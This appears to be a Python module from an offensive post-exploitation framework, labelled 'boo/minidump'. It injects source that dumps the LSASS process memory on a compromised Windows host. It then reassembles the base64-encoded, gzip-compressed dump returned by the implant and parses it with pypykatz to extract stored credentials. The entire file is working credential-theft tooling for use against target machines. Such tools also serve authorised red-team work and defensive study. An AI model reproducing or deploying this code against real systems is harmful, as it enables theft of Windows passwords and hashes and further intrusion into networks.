from gzip import GzipFile
from base64 import b64decode
from pypykatz.pypykatz import pypykatz


class STModule:
    def __init__(self):
        self.name = 'boo/minidump'
        self.language = 'boo'
        self.description = 'Creates a memorydump of LSASS via Native Win32 API Calls'
        self.author = '@byt3bl33d3r'
        self.options = {
            'Dumpfile': {
                'Description': 'The Path of the dumpfile',
                'Required': False,
                'Value': "C:\\\\WINDOWS\\\\Temp\\\\debug.bin"
            },
        }

    def payload(self):
        with open('modules/boo/src/minidump.boo', 'r') as module_src:
            src = module_src.read()
            src = src.replace('DUMPFILE_PATH', self.options['Dumpfile']['Value'])
            return src

    def process(self, context, output):
        encoded_dmp = f"./logs/{context.session.guid}/boo_minidump.dmp.enc"
        compressed_dmp = f"./logs/{context.session.guid}/boo_minidump.dmp.comp"
        dmp = f"./logs/{context.session.guid}/boo_minidump.dmp"

        if output == "EOF":
            with open(encoded_dmp) as enc_dump:
                with open(compressed_dmp, "wb") as comp_dump:
                    comp_dump.write(b64decode(enc_dump.read()))

            with open(compressed_dmp, "rb") as comp_dump:
                with open(dmp, "wb") as inflated_dmp:
                    with GzipFile(fileobj=comp_dump) as gzip_dmp:
                        inflated_dmp.write(gzip_dmp.read())

            return pypykatz.parse_minidump_file(dmp)

        else:
            with open(encoded_dmp, 'a+') as dumpfile:
                dumpfile.write(output)
